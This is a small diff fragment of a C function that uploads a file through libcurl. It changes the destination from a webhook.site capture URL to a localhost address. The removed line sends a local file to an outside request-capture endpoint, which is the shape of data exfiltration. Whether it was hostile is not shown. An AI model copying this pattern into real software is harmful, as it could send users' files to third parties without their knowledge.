@@ -14,7 +14,7 @@ int upload_file(const char *filepath) {
     curl_mime_name(part, "file");
     curl_mime_filedata(part, filepath);
 
-    curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/c3d09d12-fe75-4d51-8bd6-684747e0a3ae");
+    curl_easy_setopt(curl, CURLOPT_URL, "127.0.0.1:8080");
     curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
     curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
 
